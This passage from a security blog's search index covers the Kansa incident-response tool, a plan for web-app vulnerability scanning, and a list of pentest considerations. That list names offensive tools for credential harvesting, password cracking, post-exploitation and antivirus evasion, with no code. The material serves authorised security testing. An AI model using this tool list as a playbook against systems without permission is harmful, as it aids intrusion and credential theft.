C:\\Tools\\Kansa-master&amp;gt;Running Modules StandaloneKansa modules can be run as standalone utilities outside of the Kansa framework. Why might you want to do this? Consider netstat -naob, theoutput of the command line utility is ugly and doesn’t easily lenditself to analysis.Modules\\Net\\Get-Netstat.ps1as a standalone script will call netstat -naob, but it will returnPowershell objects in an easy to read, easy to analyze format. You caneasily convert its output to CSV, TSV or XML using normal Powershellcmdlets. Here’s an example:.\\Get-Netstat.ps1 | ConvertTo-CSV -Delimiter &quot;`t&quot; -NoTypeInformation | % { $_ -replace &quot;`&quot;&quot; } | Set-Content netstat.tsvReferences Powershell Introdution from : https://tryhackme.com/room/powershell Kansa adhdproject : [adhdproject.github.io] (https://adhdproject.github.io/#!Windows/Kansa.md#Example_1:_Usage) 13Cubed video : [13cubed] (https://www.youtube.com/watch?v=OIT9oaFmXZU) Jon Ketchum : [SANS DFIR YouTube] (https://www.youtube.com/watch?v=ZyTbqpc7H-M)Kansa for Enterprise Scale Threat Hunting, Jonathan Ketchum.pdf" }, { "title": "WebAppPentestProject", "url": "/posts/WebAppPentestProject/", "categories": "webapp", "tags": "pentest", "date": "2018-05-31 18:26:00 -0700", "snippet": "OverviewAssumed: SDL (Software Development Lifecycle) and Change management assumed.Workflow:Coders need to ensure they perform test (secure coding practices) on their code before moving it to a Web Server. - https://www.owasp.org/index.php/SWAMP_OWASPhttps://snyk.io/product/open-source-security-management/Once a server is built and web app is installed on it then the owners of Web Application may use a Web App scanning tool to ensure OWASP 10 (2017) is effective.https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdfThe server the Web Application lives also needs to be included in patch management to ensure it doesn’t have security flaws. (the server will find its way to another security process for auditing network services for Operating System (OS) level and OS level applications such as Java)This should be a cyclic (regularly repeated) as new code is developed and pushed to Web App.Security can do audits on a monthly/Annual basis (However this should be based off Risk Team findings of riskiest WebApps to business) and send reports of findings to owners of Web AppsRisk team in Security will review Web App Security audit findings and determine if a Risk needs to be registered and or elevated to senior leadership for consideration as it may be patient impacting with sever consequences to Orgs brand.**Low Hanging Fruit (LHF) Web App PenTest ****Requirement: **Push button and scan large set of Web Apps for OWASP top 10 vulns.Tools:NetsparkerBurpSuite Pro (AutoScan)ArachniOpen Source Github tools, Kali tools, Gobuster, nikto, nmap, ZapProxy, AMASS, etcDistrusted SSL Certs: https://www.ssllabs.com/ssltest/**Assumptions: **Feed reports into Risk for risk assessments (reports are very manual and do not scale-Takes a FTE to manual submit for each website)This is not an operational endeavor, it’s a governance audit.This is ONLY an audit of Web Application Pentest Security for use for Risk to create remediation’s and Risk Registry entries as required.Lower mean-time to detection and remediation of technical flaws in WebApps. &amp;lt;– however this should get push down to Developers and secure coding and web app scans they do themselves.Will NOT Scale to entire Organization Public facing Web Apps since we have one of everything and we will be using a one size fits all approach with LHF detection.Will sacrifice in-depth comprehensive Web App pentest in favor of doing only low hanging fruit auto-scans that doesn’t test everything including requirement of manual tests where an actual person needs to do.The Web Apps we test may go down. Better us than someone else I suppose.Eventually Dev teams need to have secure code practices and web app security scans baked into their SDLC.**Reference baseline info around Web App Pentest **https://www.troyhunt.com/automating-web-security-reviews-with/https://www.netsparker.com/blog/web-security/how-to-evaluate-web-application-security-scanners-tools/https://www.owasp.org/images/b/b0/OWASP_Top_10_2017_RC2_Final.pdf" }, { "title": "Proposed Considerations for Pentesting - PentestProject", "url": "/posts/PentestProject/", "categories": "hacking", "tags": "Pentest", "date": "2018-02-28 17:26:00 -0800", "snippet": "Pentesting Project ConsiderationsBelow Original png is FROM: https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad.pngRequirements for consideration• Utilized this approach: MITRE Framework for Adversary Tactics, Techniques, and common knowledge (ATT&amp;amp;CK).• Persistence, PrivEsc, Defense Evasion, Credential Access, Discovery, Lateral Movement, Execution, Collection, Ex-filtration, Command and Control.• Reporting design to train/help Blue Teams.• Based off the MITRE ATT&amp;amp;CK framework• Able to attack Web and Network devices.• Able to attack from inside and outside environment• Infrastructure for pentesting• Metasploit Pro (inside/outside Azure) for Web App/ Network Exploitation.• Kali (inside/outside Azure)• Empire (PowerShell Post Exploitation)• Ngrok• ProxyChains• WPScan (WordPress Vuln Scanner)• Nikto (Web App Vuln scanner)• Responder (Windows Hash harvesting)• John (password cracking)• Hydra (password guessing/BruteForce)• Cobalt Strike (Commercial product), Mythic (OpenSource), Sliver• Custom Widows box for exploitation• DLL Side Loading• WinPEAS, LINPEAS• PingCastle, GoodHound, PurpleKnighthttps://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-reviewhttps://github.com/Neo23x0/Loki• Ad-Find• SpecterOps tools (GhostPack, etc)• BloodHound• https://www.slideshare.net/RusselVanTuyl/powershell-for-cyber-warriors-bsides-knoxville-2016• Custom Mac box for OSX exploitation• Rainbow tables -Password Cracking/Guessing• Spear Phishing (Metasploit Pro)• Burp Suite Pro (inside/outside Web Application)• WiFi Pinapple• Physical access will be in-scope such as getting into Data Centers or work-spaces (cubicles, etc)• Team Foundations for (exploit) code repository (free up to 5 people and hosted on o365)• HaveIBeenPwned API to check Password reuse.• Scripts to perform parts of the MITRE ATT&amp;amp;CK framework.• Pentesting Lab with VMware Workstation to create replicate Org Environment to perform testing, Join random computer to domain.• Test exploits on Operating systems• Test Evasion methods on Anti-Virus• Test MITRE ATT&amp;amp;CK approach• Test automation• Pentest standards: http://www.pentest-standard.org/index.php/Main_PageAssumptions• Written permission from CISO/Department/Organization to perform pentest.• Appropriate Rules of Engagement and Scoping performed before Pentesting/Red Team Ops.• Pentest/Red team Ops plan• Asset Inventory either in IP Addresses or more broadly the domains.• Feed results into Risk Team• Feed results into DFIR/Detection Teams with IoC identified and added to Mandiant IOCe• Management of reporting/measurements of results• Primary Prioritized required by Risk teams recommendations• Secondary prioritization required by management needs" } ]
